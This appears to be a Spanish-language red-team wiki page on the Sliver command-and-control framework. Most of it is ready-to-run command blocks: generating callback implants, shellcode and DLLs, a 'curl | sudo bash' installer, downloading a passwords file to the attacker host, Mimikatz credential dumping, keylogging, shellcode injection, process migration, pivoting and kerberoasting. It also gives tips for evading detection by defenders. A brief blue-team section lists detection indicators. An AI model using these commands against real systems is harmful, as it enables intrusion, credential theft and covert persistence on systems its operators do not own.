---
icon: transmission
---

# Sliver C2

Sliver es un framework de Command & Control (C2) open source desarrollado por BishopFox, escrito en Go. Está diseñado como alternativa a Cobalt Strike para operaciones de red team: genera implantes cross-platform (Windows, Linux, macOS), soporta múltiples protocolos de comunicación y tiene una arquitectura cliente-servidor que permite operaciones en equipo. Al estar escrito en Go, los implantes son binarios autocontenidos sin dependencias externas.

### Arquitectura

Sliver funciona con un modelo cliente-servidor. El **servidor** (`sliver-server`) gestiona las sesiones activas, los listeners y los implantes generados. Los **clientes** (`sliver-client`) se conectan al servidor mediante mTLS para operar desde múltiples máquinas simultáneamente. Los **implantes** (beacons o sessions) se ejecutan en los hosts comprometidos y se comunican de vuelta al servidor.

```
[Operador] → sliver-client → [sliver-server] ← implante en el target
```

### Instalación

```bash
# Descargar la última release desde GitHub
curl -L https://github.com/BishopFoxLabs/sliver/releases/latest/download/sliver-server_linux -o sliver-server
chmod +x sliver-server

# Primera ejecución — genera certificados y configuración
./sliver-server

# El cliente se distribuye de la misma forma
curl -L https://github.com/BishopFoxLabs/sliver/releases/latest/download/sliver-client_linux -o sliver-client
chmod +x sliver-client
```

Para instalación completa con todas las dependencias (compiladores, mingw para cross-compilation):

```bash
# Script de instalación automática
curl https://sliver.sh/install | sudo bash
```

### Configuración del servidor y operadores

```
# Arrancar el servidor
./sliver-server

# Dentro de la consola del servidor — generar config para operador
multiplayer
new-operator --name pyrhos --lhost 10.10.10.1
# Genera pyrhos_10.10.10.1.cfg

# El operador importa la config en su cliente
./sliver-client import pyrhos_10.10.10.1.cfg
./sliver-client
```

### Listeners — protocolos de C2

Sliver soporta múltiples protocolos de transporte. Elegir el correcto depende del entorno del target y las restricciones de red.

| Protocolo     | Comando          | Puerto por defecto | Notas                                                         |
| ------------- | ---------------- | ------------------ | ------------------------------------------------------------- |
| **mTLS**      | `mtls`           | 8888               | Cifrado mutuo TLS — detectable por inspección de certificados |
| **WireGuard** | `wg`             | 51820 UDP          | Túnel VPN cifrado                                             |
| **HTTP/S**    | `http` / `https` | 80 / 443           | Más sigiloso, mezcla con tráfico web                          |
| **DNS**       | `dns`            | 53                 | Muy sigiloso, lento — ideal cuando solo hay resolución DNS    |
| **TCP**       | `tcp-pivot`      | variable           | Pivoting entre segmentos de red                               |

```
# Abrir listener mTLS
mtls --lhost 10.10.10.1 --lport 8888

# Listener HTTPS
https --lhost 10.10.10.1 --lport 443 --domain empresa.com

# Listener DNS
dns --domains c2.empresa.com

# Ver listeners activos
jobs
```

### Generación de implantes

Sliver distingue dos tipos de implante:

**Session** — conexión interactiva persistente. Responde inmediatamente a los comandos. Más ruidoso.

**Beacon** — modelo sleep/check-in. El implante duerme un tiempo configurable y solo contacta al C2 periódicamente. Mucho más sigiloso en operaciones largas.

#### Generar implantes

```bash
# Session — Windows x64 via mTLS
generate --mtls 10.10.10.1:8888 --os windows --arch amd64 --format exe --save /tmp/implant.exe

# Beacon — Windows x64 via HTTPS, check-in cada 60s con jitter de 30s
generate beacon --https 10.10.10.1:443 --os windows --arch amd64 \
  --seconds 60 --jitter 30 --format exe --save /tmp/beacon.exe

# Linux — session via mTLS
generate --mtls 10.10.10.1:8888 --os linux --arch amd64 --format elf --save /tmp/implant

# macOS — beacon via DNS
generate beacon --dns c2.empresa.com --os darwin --arch amd64 \
  --seconds 120 --jitter 60 --format macho --save /tmp/beacon_mac

# Shellcode (para injection en otro proceso)
generate --mtls 10.10.10.1:8888 --os windows --arch amd64 --format shellcode --save /tmp/implant.bin

# Shared library / DLL
generate --mtls 10.10.10.1:8888 --os windows --arch amd64 --format shared --save /tmp/implant.dll
```

#### Opciones relevantes de generación

| Flag                           | Descripción                                     |
| ------------------------------ | ----------------------------------------------- |
| `--mtls` / `--https` / `--dns` | Protocolo C2 y dirección del servidor           |
| `--os`                         | Sistema operativo: `windows`, `linux`, `darwin` |
| `--arch`                       | Arquitectura: `amd64`, `arm64`, `386`           |
| `--format`                     | `exe`, `elf`, `macho`, `shellcode`, `shared`    |
| `--seconds`                    | Intervalo de check-in (solo beacons)            |
| `--jitter`                     | Variación aleatoria del intervalo (segundos)    |
| `--name`                       | Nombre personalizado del implante               |
| `--evasion`                    | Activar técnicas de evasión básicas             |
| `--skip-symbols`               | Eliminar símbolos de debug del binario          |
| `--save`                       | Ruta de salida del implante                     |

### Gestión de sesiones y beacons

```
# Ver sesiones activas
sessions

# Interactuar con una sesión
use <ID>
# o
sessions -i <ID>

# Ver beacons activos
beacons

# Interactuar con un beacon
use <ID>

# Cerrar sesión activa
kill
```

### Comandos dentro de una sesión

Una vez dentro de una sesión o beacon, los comandos principales:

#### Reconocimiento del sistema

```
# Información del sistema
info
sysinfo

# Usuario actual y permisos
whoami
getuid
getpid

# Procesos en ejecución
ps

# Estructura de red
ifconfig
netstat

# Archivos y directorios
ls
ls C:\\Users\\
cd C:\\Users\\Administrator
pwd

# Descarga de archivos al host atacante
download C:\\Users\\Administrator\\passwords.txt

# Subida de archivos al target
upload /tmp/herramienta.exe C:\\Windows\\Temp\\herramienta.exe
```

#### Ejecución de comandos

```
# Ejecutar comando del sistema
shell whoami
shell cmd.exe /c ipconfig /all

# PowerShell
execute-assembly /tmp/SharpHound.exe -c all
powershell Get-Process

# Ejecutar shellcode en proceso remoto
execute-shellcode --pid 1234 /tmp/payload.bin
```

#### Operaciones de red

```
# Port forwarding — redirigir puerto remoto al host atacante
portfwd add --remote 192.168.1.10:3389 --local 127.0.0.1:13389

# SOCKS5 proxy — permite usar proxychains sobre la sesión
socks5 start --lport 1080

# Ver reenvíos activos
portfwd
```

### Pivoting

Una de las capacidades más útiles de Sliver en redes segmentadas: usar un implante como punto de pivoting para alcanzar segmentos internos.

```
# Crear listener TCP en el host comprometido para pivoting
tcp-pivot --lport 9898

# Generar implante que use el pivot como C2
generate --tcp-pivot 192.168.1.50:9898 --os windows --arch amd64 --save /tmp/pivot_implant.exe

# SOCKS5 para tráfico arbitrario
socks5 start --lport 1080

# En el host atacante — configurar proxychains
# /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -p 445 192.168.2.0/24
```

### Armamento — módulos de post-explotación

#### Ejecución de .NET en memoria (execute-assembly)

Permite ejecutar herramientas .NET directamente en memoria sin tocar disco, usando el proceso de Sliver como host:

```
execute-assembly /tmp/SharpHound.exe -c all --domain dominio.local
execute-assembly /tmp/Rubeus.exe kerberoast /nowrap
execute-assembly /tmp/Seatbelt.exe -group=all
execute-assembly /tmp/SharpView.exe Get-DomainUser
```

#### Armoring — BOF (Beacon Object Files)

Sliver soporta BOFs de Cobalt Strike, lo que amplía enormemente el arsenal disponible:

```
# Cargar un armory (colección de BOFs y extensiones)
armory install all

# Ver extensiones disponibles
armory

# Ejecutar extensión
sharp-hound-4 -- -c all
```

#### Mimikatz integrado

```
# Ejecutar Mimikatz en memoria
mimikatz -- "sekurlsa::logonpasswords"
mimikatz -- "lsadump::sam"
mimikatz -- "privilege::debug sekurlsa::logonpasswords exit"
```

#### Screenshot y keylogger

```
# Capturar pantalla del sistema comprometido
screenshot

# Keylogger (dump del buffer)
start-keylogger
keylog-dump
stop-keylogger
```

### Evasión

```
# Generar implante con evasión activada
generate --mtls 10.10.10.1:8888 --os windows --evasion --skip-symbols --format exe

# Inyección en proceso legítimo
migrate --pid 1234

# Spawner — ejecutar implante en proceso hijo
spawner --process notepad.exe
```

> La opción `--evasion` de Sliver activa técnicas básicas de ofuscación pero no garantiza bypass de EDRs modernos. Para evasión avanzada se necesita combinar con cargadores personalizados, process injection y firmas personalizadas de los implantes.

### Comparativa con otros C2

| Característica       | Sliver                | Cobalt Strike         | Metasploit  |
| -------------------- | --------------------- | --------------------- | ----------- |
| Licencia             | Open source (MIT)     | Comercial (\~$5k/año) | Open source |
| Lenguaje implante    | Go                    | C/C++                 | Ruby/C      |
| Detección AV         | Media-alta            | Alta (muy conocido)   | Alta        |
| Protocolos C2        | mTLS, WG, HTTP/S, DNS | HTTP/S, DNS, SMB      | TCP, HTTP   |
| Multiplayer          | Sí (nativo)           | Sí (teamserver)       | Limitado    |
| BOF support          | Sí                    | Sí (nativo)           | No          |
| Curva de aprendizaje | Media                 | Alta                  | Baja        |

### Detección — perspectiva Blue Team

Sliver deja huellas específicas que los defensores pueden buscar:

* **Certificados TLS autofirmados** con campos característicos de Sliver en listeners mTLS/HTTPS
* **Nombres de implante aleatorios** en mayúsculas (p. ej., `FAST_DOLPHIN`, `STRONG_MANGO`) — Sliver los genera así por defecto
* **Llamadas a APIs de reflective DLL injection** y `CreateRemoteThread` en análisis de memoria
* **Tráfico DNS** con dominios de check-in en patrones regulares con jitter
* **Event ID 4688** — creación de procesos con argumentos sospechosos
* Reglas YARA y Sigma para Sliver están disponibles en repositorios públicos (Sigma HQ, CAPE Sandbox)

> Para reducir la detección por nombre de implante, usar `--name` al generar para reemplazar el nombre aleatorio por defecto. Para reducir la detección por certificado, configurar un redirector con certificado legítimo (Let's Encrypt) delante del listener HTTPS.

### Referencias

* Repositorio oficial: `github.com/BishopFoxLabs/sliver`
* Wiki: `github.com/BishopFoxLabs/sliver/wiki`
* Armory (extensiones): `github.com/sliverarmory`
